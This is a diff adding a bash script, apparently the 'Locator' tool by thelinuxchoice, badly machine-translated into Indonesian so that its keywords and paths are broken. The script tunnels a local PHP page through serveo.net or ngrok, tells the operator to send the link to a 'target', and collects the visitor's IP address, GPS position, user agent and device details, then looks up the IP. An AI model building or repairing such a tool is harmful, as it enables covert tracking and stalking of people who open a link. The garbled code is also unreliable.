@@ -1,0 +1,389 @@
+#! / bin / bash
+# Locator v1.0
+# Dikodekan oleh: thelinuxchoice (Anda tidak menjadi pembuat kode hanya dengan mengubah kredit)
+# Github: https://github.com/thelinuxchoice/locator
+
+trap  ' printf "\ n"; stop; keluar 1 ' 2
+
+
+dependensi () {
+
+perintah -v php > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan php tetapi belum diinstal. Instal. Batalkan. " ;  keluar 1 ; }
+
+
+
+command -v curl > / dev / null 2> & 1  || { echo  > & 2  " Saya perlu ikal tetapi tidak diinstal. Instal. Batalkan. " ;  keluar 1 ; }
+
+}
+
+
+stop () {
+
+checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
+checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
+checkssh = $ ( ps aux | grep -o " ssh "  | head -n1 )
+if [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  kemudian
+pkill -f -2 ngrok > / dev / null 2> & 1
+killall -2 ngrok > / dev / null 2> & 1
+fi
+if [[ $ checkphp  ==  * ' php ' * ]] ;  kemudian
+pkill -f -2 php > / dev / null 2> & 1
+killall -2 php > / dev / null 2> & 1
+fi
+if [[ $ checkssh  ==  * ' ssh ' * ]] ;  kemudian
+pkill -f -2 ssh > / dev / null 2> & 1
+killall ssh > / dev / null 2> & 1
+fi
+if [[ -e sendlink]] ;  kemudian
+rm -rf sendlink
+fi
+
+
+
+}
+
+
+
+
+catch_cred () {
+
+bujur = $ ( grep -o ' Bujur:. * ' server / geolocate.txt | cut -d "  " -f2 | tr -d '  ' )
+IFS = $ ' \ n '
+latitude = $ ( grep -o ' Latitude:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+altitude = $ ( grep -o ' Altitude:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+akurasi = $ ( grep -o ' Akurasi:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+hardware = $ ( grep -o ' Cores:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+speed = $ ( grep -o ' Speed:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+platform = $ ( grep -o ' Platform:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+heading = $ ( grep -o ' Heading:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+memory = $ ( grep -o ' Memory:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+useragent = $ ( grep -o ' Agen-Pengguna:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+height = $ ( grep -o ' Tinggi Layar:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+width = $ ( grep -o ' Lebar Layar:. * ' server / geolocate.txt | cut -d " : " -f2 | tr -d '  ' )
+printf  " \ n "
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m ::: \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Geolokasi: \ n "
+printf  " \ n "
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Latitude: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ latitude
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Bujur: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ bujur
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Ketinggian: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ ketinggian
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Kecepatan: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ kecepatan
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; Tajuk 92m: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ heading
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Akurasi: \ e [0m \ e [ 1; 77m% sm \ n \ e [0m "  $ akurasi
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Peta: \ e [0m \ e [ 1; 77m https://www.google.com/maps/place/%s+%s#n\e[0m "  $ latitude  $ longitude
+printf  " \ n "
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m ::: \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Info Perangkat: \ n "
+printf  " \ n "
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Platform: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ platform
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Cores: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ hardware
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; Agen Pengguna 92m: \ e [0m \ e [1; 77m% s \ n \ e [0m "  $ useragent
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Memory: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ memory
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; Resolusi 92m: \ e [0m \ e [ 1; 77m% sx% s \ n \ e [0m "  $ tinggi  $ lebar
+server cat / geolocate.txt >> server / Saved.geolocate.txt
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Disimpan: \ e [0m \ e [1; 77m server / saved.geolocate.txt \ e [0m \ n " 
+killall -2 php > / dev / null 2> & 1
+killall -2 ngrok > / dev / null 2> & 1
+killall ssh > / dev / null 2> & 1
+if [[ -e sendlink]] ;  kemudian
+rm -rf sendlink
+fi
+keluar 1
+
+}
+
+getcredentials () {
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Menunggu Geolokasi ... \ e [0m \ n "
+sementara [ benar ] ;  melakukan
+
+
+jika [[ -e  " server / geolocate.txt " ]] ;  kemudian
+printf  " \ n \ e [1; 93m [\ e [0m * \ e [1; 93m] \ e [0m \ e [1; 92m Geolokasi Ditemukan! \ n "
+catch_cred
+
+fi
+tidur 0,5
+jika [[ -e  " server / error.txt " ]] ;  kemudian
+printf  " \ n \ e [1; 93m [\ e [0m * \ e [1; 93m] \ e [0m \ e [1; 92m Kesalahan pada Geolokasi! \ n "
+checkerror = $ ( grep -o ' Error:. * ' server / error.txt | cut -d "  " -f2 | tr -d '  '  )
+if [[ $ checkerror  == 1]] ;  kemudian
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Pengguna Ditolak Geolokasi ... \ e [0m \ n "
+
+rm -rf server / error.txt
+dapatkan kepercayaan
+elif [[ $ checkerror  == 2]] ;  kemudian
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Geolokasi Tidak Tersedia ... \ e [0m \ n "
+
+rm -rf server / error.txt
+dapatkan kepercayaan
+elif [[ $ checkerror  == 3]] ;  kemudian
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Waktu Henti ... \ e [0m \ n "
+
+rm -rf server / error.txt
+dapatkan kepercayaan
+elif [[ $ checkerror  == 4]] ;  kemudian
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kesalahan Tidak Diketahui ... \ e [0m \ n "
+
+rm -rf server / error.txt
+dapatkan kepercayaan
+lain
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kesalahan saat membaca file error.txt ... \ e [0m \ n "
+keluar 1
+fi
+fi
+tidur 0,5
+
+
+
+selesai 
+
+
+}
+
+catch_ip () {
+sentuh server / Saved.geolocate.txt
+ip = $ ( grep -a ' IP: ' server / ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
+IFS = $ ' \ n '
+ua = $ ( grep ' User-Agent: ' server / ip.txt | cut -d ' " ' -f2 )
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] IP Target: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Agen Pengguna: \ e [0m \ e [1; 77m% s \ e [ 0m \ n "  $ ua
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Disimpan: \ e [0m \ e [1; server 77m / save.ip.txt \ e [0m \ n "
+server cat / ip.txt >> server / diselamatkan.ip.txt
+
+
+if [[ -e iptracker.log]] ;  kemudian
+rm -rf iptracker.log
+fi
+
+IFS = ' \ n '
+iptracker = $ ( curl -s -L " www.ip-tracker.org/locator/ip-lookup.php?ip= $ ip " --user-agent " Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.31 ( KHTML, seperti Gecko) Chrome / 26.0.1410.63 Safari / 537.31 "  > iptracker.log )
+IFS = $ ' \ n '
+benua = $ ( grep -o ' Benua. * ' iptracker.log | head -n1 | cut -d " > " -f3 | cut -d " < " -f1 )
+printf  " \ n "
+hostnameip = $ ( grep -o " </td></tr><tr> <th> Nama Host:. * " iptracker.log | cut -d " < " -f7 | cut -d " > " -f2 )
+if [[ $ hostnameip  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Nama Host: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ hostnameip
+fi
+# #
+
+reverse_dns = $ ( grep -a " </td></tr><tr> <th> Nama Host:. * " iptracker.log | cut -d " < " -f1 )
+if [[ $ reverse_dns  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Reverse DNS: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ reverse_dns
+fi
+# #
+
+
+if [[ $ benua  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Benua IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ benua
+fi
+# #
+
+negara = $ ( grep -o ' Negara:. * ' iptracker.log | cut -d " > " -f3 | cut -d " & " -f1 )
+if [[ $ country  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] IP Negara: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ negara
+fi
+# #
+
+state = $ ( grep -o " tracking lessimpt. * " iptracker.log | cut -d " < " -f1 | cut -d " > " -f2 )
+if [[ $ state  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Status: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ state
+fi
+# #
+city ​​= $ ( grep -o " Lokasi Kota:. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
+
+if [[ $ city  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Lokasi Kota: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ city
+fi
+# #
+
+isp = $ ( grep -o " ISP:. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
+if [[ $ isp  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] ISP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ isp
+fi
+# #
+
+as_number = $ ( grep -o " AS Number:. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
+if [[ $ as_number  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] AS Number: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ as_number
+fi
+# #
+
+ip_speed = $ ( grep -o " Kecepatan Alamat IP:. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
+if [[ $ ip_speed  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] Kecepatan Alamat IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip_speed
+fi
+# #
+ip_currency = $ ( grep -o " IP Currency:. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
+
+if [[ $ ip_currency  ! =  " " ]] ;  kemudian
+printf  " \ e [1; 92m [*] IP Mata Uang: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip_currency
+fi
+# #
+printf  " \ n "
+rm -rf iptracker.log
+
+dapatkan kepercayaan
+}
+
+# #
+serverx () {
+printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Memulai server php ... \ n "
+php -t " server / " -S 127.0.0.1: $ port  > / dev / null 2> & 1  & 
+tidur 2
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Server mulai ... \ e [0m \ n "
+perintah -v ssh > / dev / null 2> & 1  || { echo  > & 2  " Saya memerlukan SSH tetapi tidak diinstal. Instal. Batalkan. " ;  keluar 1 ; }
+if [[ -e sendlink]] ;  kemudian
+rm -rf sendlink
+fi
+$ ( yang sh ) -c ' ssh -o StrictHostKeyChecking = no -o ServerAliveInterval = 60 -R 80: localhost: ' $ port ' serveo.net 2> / dev / null> sendlink '  &
+printf  " \ n "
+tidur 4 # &
+send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
+printf  " \ n "
+printf  ' \ n \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kirim tautan langsung ke target: \ e [0m \ e [1; 77m] % s \ n '  $ send_link
+send_ip = $ ( curl -s http://tinyurl.com/api-create.php ? url = $ send_link )
+printf  ' \ n \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Atau menggunakan tinyurl: \ e [0m \ e [1; 77m% s \ n '  $ send_ip
+printf  " \ n "
+checkfound
+
+
+}
+
+startx () {
+if [[ -e server / ip.txt]] ;  kemudian
+rm -rf server / ip.txt
+
+fi
+if [[ -e server / geolocate.txt]] ;  kemudian
+rm -rf server / geolocate.txt
+
+fi
+
+if [[ -e server / error.txt]] ;  kemudian
+rm -rf server / error.txt
+
+fi
+
+default_port = " 55333 "  # $ (seq 1111 4444 | sort -R | head -n1)
+printf  ' \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Pilih Port (Default: \ e [0m \ e [1; 77m 55333 \ e [0m \ e [1; 92m): \ e [0m '  $ default_port
+baca port
+port = " $ {port : - $ {default_port} } "
+serverx
+
+}
+
+
+# #
+
+mulai () {
+if [[ -e server / ip.txt]] ;  kemudian
+rm -rf server / ip.txt
+
+fi
+if [[ -e server / geolocate.txt]] ;  kemudian
+rm -rf server / geolocate.txt
+
+fi
+
+if [[ -e server / error.txt]] ;  kemudian
+rm -rf server / error.txt
+
+fi
+if [[ -e ngrok]] ;  kemudian
+gema  " "
+lain
+
+printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Mengunduh Ngrok ... \ n "
+arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
+arch2 = $ ( uname -a | grep -o ' Android '  | head -n1 )
+if [[ $ arch  ==  * ' arm ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  kemudian
+perintah -v wget > / dev / null 2> & 1  || { echo  > & 2  " Saya perlu wget tetapi tidak terpasang. Instal. Batalkan. " ;  keluar 1 ; }
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1
+
+if [[ -e ngrok-stable-linux-arm.zip]] ;  kemudian
+unzip ngrok-stable-linux-arm.zip > / dev / null 2> & 1
+chmod + x ngrok
+rm -rf ngrok-stable-linux-arm.zip
+lain
+printf  " \ e [1; 93m [!] Kesalahan pengunduhan ... Termux, jalankan: \ e [0m \ e [1; 77m pkg instal wget \ e [0m \ n "
+keluar 1
+fi
+
+
+
+lain
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
+if [[ -e ngrok-stable-linux-386.zip]] ;  kemudian
+perintah -v unzip > / dev / null 2> & 1  || { echo  > & 2  " Saya perlu unzip tetapi tidak diinstal. Instal. Batalkan. " ;  keluar 1 ; }
+unzip ngrok-stable-linux-386.zip > / dev / null 2> & 1
+chmod + x ngrok
+rm -rf ngrok-stable-linux-386.zip
+lain
+printf  " \ e [1; 93m [!] Kesalahan unduhan ... \ e [0m \ n "
+keluar 1
+fi
+fi
+fi
+
+printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Memulai server php ... \ n "
+php -t " server / " -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
+tidur 2
+printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Memulai server ngrok ... \ n "
+./ngrok http 3333 > / dev / null 2> & 1  &
+tidur 10
+
+tautan = $ ( curl -s -N http://127.0.0.1:4040/status | grep -o " https: // [0-9a-z] * \. ngrok.io " )
+printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Kirim tautan ini ke Target: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ tautan
+checkfound
+}
+
+start1 () {
+printf  " \ n "
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net (Tuning SSH, Terbaik!) \ e [0m \ n "
+printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93 m Ngrok \ e [0m \ n " "
+default_option_server = " 1 "
+baca -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Pilih opsi Port Forwarding: \ e [0m \ e n ' option_server
+option_server = " $ {option_server : - $ {default_option_server} } "
+if [[ $ option_server  == 1 ||  $ option_server  == 01]] ;  kemudian
+startx
+
+elif [[ $ option_server  == 2 ||  $ option_server  == 02]] ;  kemudian
+mulai
+lain
+printf  " \ e [1; 93m [!] Opsi tidak valid! \ e [0m \ n "
+tidur 1
+bersih
+start1
+fi
+
+}
+checkfound () {
+
+printf  " \ n "
+printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Menunggu target, buka tautan ... \ e [0m \ n "
+sementara [ benar ] ;  melakukan
+
+
+jika [[ -e  " server / ip.txt " ]] ;  kemudian
+printf  " \ n \ e [1; 92m [\ e [0m * \ e [1; 92m] IP Ditemukan! \ n "
+catch_ip
+
+fi
+tidur 1
+selesai 
+
+}
+
+spanduk () {
+
+printf  " \ e [1; 93m _ \ e [0m \ n "
+printf  " \ e [1; 93m (_) \ e [0m \ e [1; 77m_ \ e [0m \ n "
+printf  " \ e [1; 77m _ ___ ____ _____ _ | | _ ___ ____ \ e [0m \ n "
+printf  " \ e [1; 77m | | / _ \ / ___) (____ | (_ _) / _ \ / ___) \ e [0m \ n "
+printf  " \ e [1; 77m | | _____ | | _ | | ((___ / ___ | | | _ | | | | | | \ e [0m \ n "
+printf  " \ e [1; 77m | _______) \ ___ / \ ____) \ _____ | \ __) \ ___ / | _ | v1.1 \ e [0m \ n "
+printf  " \ n "
+printf  " \ e [1; 93m ::: \ e [0m \ e [1; 77m Dikodekan oleh: @thelinuxchoice \ e [0m \ n "
+
+}
+spanduk
+ketergantungan
+start1w
